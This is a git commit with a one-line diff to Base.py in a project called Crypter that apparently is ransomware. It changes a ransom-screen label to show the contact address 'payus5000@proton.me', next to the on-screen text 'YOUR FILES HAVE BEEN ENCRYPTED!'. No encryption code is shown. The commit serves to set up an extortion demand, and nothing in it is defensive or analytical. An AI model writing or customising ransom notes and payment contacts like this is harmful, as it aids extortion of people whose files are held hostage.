b71b2cd79587e053a738d9fef50d7f60d93f8893
Hoko <94093120+hokocodes@users.noreply.github.com>
2024-06-07 15:04:23 -0500

    payus5000

--- Crypter/Crypter/Base.py
+++ Crypter/Crypter/Base.py
@@ -50,7 +50,7 @@ class Base():
         "ru": u"КРИПТЕР"
         }
     GUI_LABEL_EMAIL_TEXT = {
-        "eng": "payus5000@proton.me",
+        "eng": "email: payus5000@proton.me",
     }
     GUI_LABEL_TEXT_FLASHING_ENCRYPTED = {
         "eng": "YOUR FILES HAVE BEEN ENCRYPTED!",
